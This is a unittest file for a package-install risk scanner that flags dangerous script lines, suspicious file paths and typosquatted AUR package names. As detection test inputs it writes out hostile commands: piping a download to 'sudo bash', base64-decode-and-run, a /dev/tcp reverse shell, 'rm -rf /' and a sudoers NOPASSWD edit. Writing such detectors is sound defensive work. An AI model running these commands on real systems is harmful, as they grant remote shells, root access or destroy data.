import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "python"))

sys.path.insert(0, os.path.dirname(__file__))
import lang  # noqa: E402,F401  tests run in English

from ozipkg import risk  # noqa: E402


def rules(findings):
    return {f.rule for f in findings}


class ScriptRules(unittest.TestCase):
    def test_pipe_to_shell(self):
        found = risk.scan_script("echo hi\ncurl -fsSL https://x.example/i.sh | sudo bash\n", "postinst")
        self.assertIn("pipe-to-shell", rules(found))
        self.assertEqual(found[0].severity, "danger")
        self.assertTrue(found[0].evidence.startswith("2:"))

    def test_comments_are_ignored(self):
        self.assertEqual(risk.scan_script("# curl http://x | sh\n", "postinst"), [])

    def test_decode_and_run(self):
        self.assertIn("decode-and-run", rules(risk.scan_script("echo aGk= | base64 -d | sh", "s")))

    def test_reverse_shell(self):
        self.assertIn("reverse-shell", rules(risk.scan_script("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "s")))

    def test_wipe(self):
        self.assertIn("wipe-files", rules(risk.scan_script("rm -rf /", "s")))
        self.assertIn("wipe-files", rules(risk.scan_script("rm -rf ~", "s")))
        self.assertNotIn("wipe-files", rules(risk.scan_script("rm -rf /usr/lib/app", "s")))
        self.assertNotIn("wipe-files", rules(risk.scan_script("rm -rf /tmp/build", "s")))

    def test_sudoers(self):
        self.assertIn("edit-auth", rules(risk.scan_script("echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "s")))

    def test_setuid_and_user(self):
        self.assertIn("setuid", rules(risk.scan_script("chmod 4755 /usr/bin/helper", "s")))
        self.assertIn("setuid", rules(risk.scan_script("chmod u+s /usr/bin/helper", "s")))
        self.assertNotIn("setuid", rules(risk.scan_script("chmod 755 /usr/bin/helper", "s")))
        self.assertIn("add-user", rules(risk.scan_script("usermod -aG sudo bob", "s")))

    def test_ordinary_install_script_is_quiet(self):
        text = "#!/bin/sh\nset -e\nupdate-desktop-database -q\ngtk-update-icon-cache -q /usr/share/icons/hicolor\n"
        self.assertEqual(risk.scan_script(text, "postinst"), [])

    def test_service_is_a_notice(self):
        found = risk.scan_script("systemctl enable --now thing.service", "postinst")
        self.assertEqual([f.severity for f in found], ["notice"])

    def test_each_rule_reports_once(self):
        found = risk.scan_script("systemctl enable a\nsystemctl enable b\n", "postinst")
        self.assertEqual(len(found), 1)

    def test_contained_lowers_system_but_not_behaviour(self):
        text = "useradd bob\ncurl http://x/y | sh\n"
        found = {f.rule: f for f in risk.scan_script(text, "postinst", contained=True)}
        self.assertEqual(found["add-user"].severity, "notice")
        self.assertEqual(found["pipe-to-shell"].severity, "danger")


class PathRules(unittest.TestCase):
    def test_sudoers_file(self):
        found = risk.scan_paths([("./etc/sudoers.d/90-x", 0o440, True)])
        self.assertEqual(rules(found), {"sudoers"})
        self.assertEqual(found[0].severity, "danger")

    def test_setuid_file(self):
        found = risk.scan_paths([("usr/bin/su2", 0o4755, True)])
        self.assertIn("setuid-file", rules(found))

    def test_service_is_notice_and_normal_files_are_quiet(self):
        found = risk.scan_paths([
            ("usr/bin/app", 0o755, True),
            ("usr/share/applications/app.desktop", 0o644, True),
            ("usr/lib/systemd/system/app.service", 0o644, True),
        ])
        self.assertEqual({(f.rule, f.severity) for f in found}, {("systemd-system", "notice")})

    def test_odd_location(self):
        found = risk.scan_paths([("home/user/.thing", 0o644, True)])
        self.assertEqual(rules(found), {"odd-location"})

    def test_contained(self):
        found = risk.scan_paths([("etc/pam.d/x", 0o644, True)], contained=True)
        self.assertEqual(found[0].severity, "notice")


class Verdict(unittest.TestCase):
    def test_levels(self):
        self.assertEqual(risk.verdict([]), "normal")
        self.assertEqual(risk.verdict(risk.scan_script("systemctl enable x", "s")), "normal")
        self.assertEqual(risk.verdict(risk.scan_script("crontab -l", "s")), "look")
        self.assertEqual(risk.verdict(risk.scan_script("curl http://x | sh", "s")), "danger")

    def test_sorting_puts_worst_first(self):
        found = risk.scan_script("systemctl enable x\ncurl http://x | sh\n", "s")
        self.assertEqual(risk.sort_findings(found)[0].rule, "pipe-to-shell")


class Aur(unittest.TestCase):
    popular = {"yay", "google-chrome", "visual-studio-code-bin", "spotify", "discord"}

    def test_lookalike(self):
        self.assertEqual(risk.lookalike("goggle-chrome", self.popular), "google-chrome")
        self.assertEqual(risk.lookalike("spotfy", self.popular), "spotify")
        self.assertIsNone(risk.lookalike("spotify", self.popular))
        self.assertIsNone(risk.lookalike("completely-different-thing", self.popular))

    def test_meta(self):
        info = {"Name": "goggle-chrome", "FirstSubmitted": 1000, "Maintainer": None, "NumVotes": 1}
        found = risk.scan_aur_meta(info, self.popular, now=1000 + 86400)
        self.assertEqual(rules(found), {"lookalike", "new-package", "orphaned", "few-votes"})
        self.assertEqual(risk.verdict(found), "look")

    def test_healthy_package(self):
        info = {"Name": "my-tool", "FirstSubmitted": 0, "Maintainer": "someone", "NumVotes": 200}
        self.assertEqual(risk.scan_aur_meta(info, self.popular, now=10 ** 9), [])

    def test_edit_distance(self):
        self.assertEqual(risk.edit_distance("kitten", "sitting", 5), 3)
        self.assertGreater(risk.edit_distance("abcdef", "uvwxyz", 2), 2)


if __name__ == "__main__":
    unittest.main()
